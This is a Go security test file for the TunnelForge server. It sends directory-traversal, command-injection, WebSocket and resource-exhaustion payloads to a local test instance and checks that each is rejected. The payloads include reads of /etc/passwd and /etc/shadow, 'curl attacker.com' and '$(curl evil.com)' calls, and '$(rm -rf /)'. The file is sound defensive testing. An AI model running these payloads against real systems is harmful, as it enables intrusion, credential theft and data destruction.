package test

import (
	"bytes"
	"encoding/json"
	"fmt"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"
	"time"

	"github.com/gorilla/websocket"
	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"

	"github.com/ferg-cod3s/tunnelforge/go-server/internal/server"
)

// TestAdvancedSecurityPenetration performs advanced security testing
func TestAdvancedSecurityPenetration(t *testing.T) {
	if testing.Short() {
		t.Skip("Skipping penetration tests in short mode")
	}

	cfg := &server.Config{Port: "0"}
	testServer, err := server.New(cfg)
	require.NoError(t, err)

	httpServer := httptest.NewServer(testServer.Handler())
	defer httpServer.Close()

	baseURL := httpServer.URL

	t.Run("Directory_Traversal_Advanced", func(t *testing.T) {
		// Advanced directory traversal patterns
		traversalPayloads := []string{
			"../../../etc/passwd",
			"..\\..\\..\\windows\\system32\\config\\sam",
			"%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", // URL encoded
			"....//....//....//etc/passwd",            // Double encoding bypass
			"..%252f..%252f..%252fetc%252fpasswd",     // Double URL encoding
			"..%c0%af..%c0%af..%c0%afetc%c0%afpasswd", // UTF-8 encoding
			".%2e/.%2e/.%2e/etc/passwd",               // Mixed encoding
			"..././..././..././etc/passwd",            // Extra dots
			"../../../../../../proc/self/environ",     // Process environment
			"../../../../../../proc/version",          // System info
			"/var/log/apache2/access.log",             // Log files
			"/etc/shadow",                             // Shadow passwords
			"C:\\boot.ini",                            // Windows files
			"/proc/self/cmdline",                      // Process command line
		}

		for _, payload := range traversalPayloads {
			t.Run("traversal_"+strings.ReplaceAll(payload, "/", "_"), func(t *testing.T) {
				// Test in filesystem API
				resp, err := http.Get(baseURL + "/api/filesystem/ls?path=" + payload)
				require.NoError(t, err)
				defer resp.Body.Close()

				// Should reject all directory traversal attempts
				assert.Equal(t, http.StatusBadRequest, resp.StatusCode,
					"Should reject directory traversal: %s", payload)

				// Test in git API
				resp2, err := http.Get(baseURL + "/api/git/status?path=" + payload)
				require.NoError(t, err)
				defer resp2.Body.Close()

				// Should also reject in git operations
				assert.True(t, resp2.StatusCode == http.StatusBadRequest || resp2.StatusCode == http.StatusNotFound,
					"Should reject git directory traversal: %s", payload)
			})
		}
	})

	t.Run("Command_Injection_Advanced", func(t *testing.T) {
		// Advanced command injection patterns
		injectionPayloads := []string{
			// Basic injection
			"main; id",
			"main && whoami",
			"main | cat /etc/passwd",
			"main || curl attacker.com",

			// Subshells and command substitution
			"main `id`",
			"main $(whoami)",
			"main ${IFS}id",
			"main$IFS$()id",

			// Encoding bypasses
			"main;%20id", // URL encoding
			"main;\tid",  // Tab character
			"main;\nid",  // Newline
			"main;\rid",  // Carriage return
			"main;i'd'",  // Quote manipulation

			// Advanced shell features
			"main;id#comment",         // Comment to hide payload
			"main;{id,whoami}",        // Brace expansion
			"main;id>/tmp/output",     // Output redirection
			"main;id 2>&1",            // Error redirection
			"main;sleep 5",            // Time-based detection
			"main;ping -c1 127.0.0.1", // Network operations

			// Multiple command separators
			"main;id;whoami",
			"main&&id||whoami",
			"main|id&whoami",

			// Environment variable manipulation
			"main;export PATH=/tmp:$PATH;id",
			"main;HOME=/tmp id",
			"main;IFS=';' eval 'id;whoami'",

			// Process substitution
			"main;<(id)",
			"main;>(id)",

			// Glob patterns for command discovery
			"main;/bin/i?",
			"main;/usr/bin/id*",
			"main;/**/id",
		}

		for _, payload := range injectionPayloads {
			t.Run("injection_"+strings.ReplaceAll(payload, " ", "_"), func(t *testing.T) {
				// Test git checkout with injection
				checkoutPayload := map[string]string{
					"branch": payload,
				}
				jsonData, _ := json.Marshal(checkoutPayload)

				resp, err := http.Post(baseURL+"/api/git/checkout", "application/json", bytes.NewBuffer(jsonData))
				require.NoError(t, err)
				defer resp.Body.Close()

				// Should reject all command injection attempts
				assert.Equal(t, http.StatusBadRequest, resp.StatusCode,
					"Should reject command injection: %s", payload)
			})
		}
	})

	t.Run("WebSocket_Security_Testing", func(t *testing.T) {
		// Create a session for WebSocket testing
		sessionPayload := map[string]interface{}{
			"command": "echo websocket_security_test",
		}
		jsonData, _ := json.Marshal(sessionPayload)

		resp, err := http.Post(baseURL+"/api/sessions", "application/json", bytes.NewBuffer(jsonData))
		require.NoError(t, err)
		defer resp.Body.Close()

		var session map[string]interface{}
		err = json.NewDecoder(resp.Body).Decode(&session)
		require.NoError(t, err)

		sessionID := session["id"].(string)

		t.Run("WebSocket_Origin_Validation", func(t *testing.T) {
			// Test WebSocket connections from different origins
			maliciousOrigins := []string{
				"https://evil.com",
				"http://attacker.example.com",
				"javascript://malicious-code",
				"data:text/html,<script>alert('xss')</script>",
			}

			for _, origin := range maliciousOrigins {
				wsURL := strings.Replace(httpServer.URL, "http://", "ws://", 1) + "/ws?sessionId=" + sessionID

				// Create custom dialer with malicious origin
				dialer := &websocket.Dialer{
					HandshakeTimeout: 5 * time.Second,
				}

				headers := http.Header{}
				headers.Set("Origin", origin)

				conn, _, _ := dialer.Dial(wsURL, headers)
				if conn != nil {
					conn.Close()
					t.Logf("Warning: WebSocket accepted connection from origin: %s", origin)
				} else {
					t.Logf("Good: WebSocket rejected connection from origin: %s", origin)
				}

				// Note: Current implementation may allow all origins in development
				// This test documents the behavior for security review
			}
		})

		t.Run("WebSocket_Message_Injection", func(t *testing.T) {
			wsURL := strings.Replace(httpServer.URL, "http://", "ws://", 1) + "/ws?sessionId=" + sessionID

			conn, _, err := websocket.DefaultDialer.Dial(wsURL, nil)
			if err != nil {
				t.Skip("WebSocket connection failed")
			}
			defer conn.Close()

			// Test malicious message payloads
			maliciousMessages := []map[string]interface{}{
				{
					"type": "input",
					"data": "\x1b]0;$(curl evil.com)\x07", // Terminal escape sequence injection
				},
				{
					"type": "input",
					"data": "\x1b[2J\x1b[H$(rm -rf /)", // Screen manipulation + command injection
				},
				{
					"type": "resize",
					"cols": -1,
					"rows": -1, // Invalid dimensions
				},
				{
					"type": "input",
					"data": strings.Repeat("A", 100000), // Large payload
				},
				{
					"type": "malicious_type",
					"data": "should_be_rejected",
				},
			}

			for _, msg := range maliciousMessages {
				err = conn.WriteJSON(msg)
				if err != nil {
					t.Logf("Good: WebSocket rejected malicious message type: %v", msg["type"])
				} else {
					t.Logf("Warning: WebSocket accepted potentially malicious message: %v", msg["type"])
				}

				// Brief pause between messages
				time.Sleep(10 * time.Millisecond)
			}
		})

		t.Run("WebSocket_Resource_Exhaustion", func(t *testing.T) {
			// Test multiple concurrent connections to same session
			connections := []*websocket.Conn{}
			wsURL := strings.Replace(httpServer.URL, "http://", "ws://", 1) + "/ws?sessionId=" + sessionID

			// Try to create many connections
			for i := 0; i < 50; i++ {
				conn, _, err := websocket.DefaultDialer.Dial(wsURL, nil)
				if err != nil {
					break
				}
				connections = append(connections, conn)
			}

			t.Logf("Created %d concurrent WebSocket connections", len(connections))

			// Clean up connections
			for _, conn := range connections {
				conn.Close()
			}

			// Should handle reasonable number of connections
			assert.True(t, len(connections) > 0, "Should allow at least some WebSocket connections")

			// But should have some limit to prevent DoS
			if len(connections) >= 50 {
				t.Log("Note: No apparent limit on concurrent WebSocket connections - consider adding limits")
			}
		})
	})

	t.Run("HTTP_Parameter_Pollution", func(t *testing.T) {
		// Test HTTP Parameter Pollution attacks
		pollutionURLs := []string{
			"/api/filesystem/ls?path=safe&path=../../../etc/passwd",
			"/api/git/status?path=.&path=../../../etc/passwd",
			"/api/sessions?limit=10&limit=9999999",
		}

		for _, url := range pollutionURLs {
			resp, err := http.Get(baseURL + url)
			require.NoError(t, err)
			defer resp.Body.Close()

			// Should handle parameter pollution safely
			t.Logf("Parameter pollution test %s returned status: %d", url, resp.StatusCode)

			// Should not succeed with malicious parameters
			assert.True(t, resp.StatusCode == http.StatusBadRequest || resp.StatusCode == http.StatusNotFound,
				"Should handle parameter pollution safely")
		}
	})

	t.Run("Resource_Exhaustion_Attacks", func(t *testing.T) {
		t.Run("Large_JSON_Payload", func(t *testing.T) {
			// Test with very large JSON payload
			largeTitle := strings.Repeat("A", 1000000) // 1MB title

			sessionPayload := map[string]interface{}{
				"title":   largeTitle,
				"command": "echo test",
			}
			jsonData, _ := json.Marshal(sessionPayload)

			resp, err := http.Post(baseURL+"/api/sessions", "application/json", bytes.NewBuffer(jsonData))
			require.NoError(t, err)
			defer resp.Body.Close()

			// Should reject or handle large payloads gracefully
			t.Logf("Large JSON payload test returned status: %d", resp.StatusCode)

			// Should not cause server crash or excessive memory usage
			assert.True(t, resp.StatusCode == http.StatusBadRequest || resp.StatusCode == http.StatusRequestEntityTooLarge,
				"Should reject excessively large JSON payloads")
		})

		t.Run("Many_Concurrent_Requests", func(t *testing.T) {
			// Test many concurrent requests to detect resource exhaustion
			const numRequests = 100
			responses := make(chan int, numRequests)

			for i := 0; i < numRequests; i++ {
				go func(id int) {
					sessionPayload := map[string]interface{}{
						"command": fmt.Sprintf("echo concurrent_test_%d", id),
					}
					jsonData, _ := json.Marshal(sessionPayload)

					client := &http.Client{Timeout: 5 * time.Second}
					resp, err := client.Post(baseURL+"/api/sessions", "application/json", bytes.NewBuffer(jsonData))
					if err != nil {
						responses <- 500 // Error
						return
					}
					defer resp.Body.Close()
					responses <- resp.StatusCode
				}(i)
			}

			// Collect results
			successCount := 0
			errorCount := 0
			for i := 0; i < numRequests; i++ {
				status := <-responses
				if status == http.StatusCreated {
					successCount++
				} else {
					errorCount++
				}
			}

			t.Logf("Concurrent requests: %d successful, %d errors", successCount, errorCount)

			// Should handle reasonable concurrent load
			assert.True(t, successCount > numRequests/2, "Should handle reasonable concurrent load")

			// Some errors are acceptable under high load
			if errorCount > numRequests/2 {
				t.Log("Note: High error rate under concurrent load - may need optimization")
			}
		})
	})

	t.Run("Protocol_Downgrade_Attacks", func(t *testing.T) {
		// Test for protocol downgrade vulnerabilities
		// This is more relevant for HTTPS deployments

		t.Run("HTTP_vs_HTTPS", func(t *testing.T) {
			// Test that sensitive operations require secure transport
			// In current test environment, we're using HTTP
			// This test documents expected behavior for production HTTPS deployment

			resp, err := http.Get(baseURL + "/api/auth/config")
			require.NoError(t, err)
			defer resp.Body.Close()

			// In production with HTTPS, should have Strict-Transport-Security header
			stsHeader := resp.Header.Get("Strict-Transport-Security")
			t.Logf("Strict-Transport-Security header: %s", stsHeader)

			// Note: In production, should enforce HTTPS for sensitive operations
		})
	})
}

// TestVulnerabilityScanning performs automated vulnerability detection
func TestVulnerabilityScanning(t *testing.T) {
	if testing.Short() {
		t.Skip("Skipping vulnerability scanning in short mode")
	}

	cfg := &server.Config{Port: "0"}
	testServer, err := server.New(cfg)
	require.NoError(t, err)

	httpServer := httptest.NewServer(testServer.Handler())
	defer httpServer.Close()

	baseURL := httpServer.URL

	t.Run("Information_Disclosure", func(t *testing.T) {
		// Test for information leakage in error messages
		malformedRequests := []struct {
			method   string
			endpoint string
			body     string
			headers  map[string]string
		}{
			{"GET", "/api/sessions/invalid-uuid", "", nil},
			{"POST", "/api/sessions", "invalid json", map[string]string{"Content-Type": "application/json"}},
			{"GET", "/api/filesystem/ls", "", nil}, // Missing required parameters
			{"POST", "/api/git/checkout", "{}", map[string]string{"Content-Type": "application/json"}},
		}

		for _, req := range malformedRequests {
			t.Run(fmt.Sprintf("%s_%s", req.method, strings.ReplaceAll(req.endpoint, "/", "_")), func(t *testing.T) {
				var httpReq *http.Request
				var err error

				if req.body != "" {
					httpReq, err = http.NewRequest(req.method, baseURL+req.endpoint, strings.NewReader(req.body))
				} else {
					httpReq, err = http.NewRequest(req.method, baseURL+req.endpoint, nil)
				}
				require.NoError(t, err)

				// Set headers
				for key, value := range req.headers {
					httpReq.Header.Set(key, value)
				}

				client := &http.Client{}
				resp, err := client.Do(httpReq)
				require.NoError(t, err)
				defer resp.Body.Close()

				// Read response body to check for information disclosure
				var responseBody bytes.Buffer
				responseBody.ReadFrom(resp.Body)
				body := responseBody.String()

				// Should not expose sensitive information in error messages
				sensitiveInfo := []string{
					"/home/", // File paths
					"/usr/",
					"/etc/",
					"panic:",    // Go panic traces
					"goroutine", // Stack traces
					"database",  // Database details
					"password",  // Credentials
					"token",     // Auth tokens
					"secret",    // Secrets
				}

				for _, sensitive := range sensitiveInfo {
					assert.NotContains(t, strings.ToLower(body), sensitive,
						"Response should not expose sensitive info: %s", sensitive)
				}

				// Error responses should be generic but helpful
				if resp.StatusCode >= 400 {
					// Should have error field but not expose internals
					if strings.Contains(resp.Header.Get("Content-Type"), "application/json") {
						var errorResponse map[string]interface{}
						json.Unmarshal(responseBody.Bytes(), &errorResponse)

						if errorMsg, exists := errorResponse["error"]; exists {
							errorStr := fmt.Sprintf("%v", errorMsg)
							t.Logf("Error message: %s", errorStr)

							// Error should be informative but not expose internals
							assert.NotEmpty(t, errorStr, "Error message should not be empty")
							assert.True(t, len(errorStr) < 500, "Error message should be concise")
						}
					}
				}
			})
		}
	})

	t.Run("Server_Fingerprinting", func(t *testing.T) {
		// Test for server fingerprinting via headers
		resp, err := http.Get(baseURL + "/health")
		require.NoError(t, err)
		defer resp.Body.Close()

		headers := resp.Header

		// Should not expose sensitive server information
		serverHeader := headers.Get("Server")
		t.Logf("Server header: %s", serverHeader)

		// Should not expose Go version, OS details, or internal software versions
		if serverHeader != "" {
			assert.NotContains(t, strings.ToLower(serverHeader), "go/")
			assert.NotContains(t, strings.ToLower(serverHeader), "linux")
			assert.NotContains(t, strings.ToLower(serverHeader), "windows")
			assert.NotContains(t, strings.ToLower(serverHeader), "darwin")
		}

		// Check other potentially revealing headers
		revealingHeaders := []string{
			"X-Powered-By",
			"X-Runtime",
			"X-Version",
			"X-AspNet-Version",
		}

		for _, header := range revealingHeaders {
			value := headers.Get(header)
			if value != "" {
				t.Logf("Potentially revealing header %s: %s", header, value)
			}
		}
	})

	t.Run("Timing_Attack_Detection", func(t *testing.T) {
		// Test for timing attacks on authentication endpoints
		if testing.Short() {
			t.Skip("Timing attack test requires longer execution")
		}

		// Test timing differences in authentication
		invalidCredentials := []map[string]string{
			{"username": "admin", "password": "wrong"},
			{"username": "nonexistent", "password": "wrong"},
			{"username": "", "password": ""},
		}

		timings := []time.Duration{}

		for _, creds := range invalidCredentials {
			start := time.Now()

			jsonData, _ := json.Marshal(creds)
			resp, _ := http.Post(baseURL+"/api/auth/login", "application/json", bytes.NewBuffer(jsonData))

			elapsed := time.Since(start)
			timings = append(timings, elapsed)

			if resp != nil {
				resp.Body.Close()
			}

			t.Logf("Auth timing for %v: %v", creds["username"], elapsed)
		}

		// Timing differences should not be significant (timing attack prevention)
		if len(timings) >= 2 {
			maxTiming := timings[0]
			minTiming := timings[0]

			for _, timing := range timings {
				if timing > maxTiming {
					maxTiming = timing
				}
				if timing < minTiming {
					minTiming = timing
				}
			}

			timingDifference := maxTiming - minTiming
			t.Logf("Timing difference: %v", timingDifference)

			// Large timing differences could indicate timing attack vulnerability
			if timingDifference > 100*time.Millisecond {
				t.Log("Note: Significant timing differences detected in auth responses")
			}
		}
	})
}
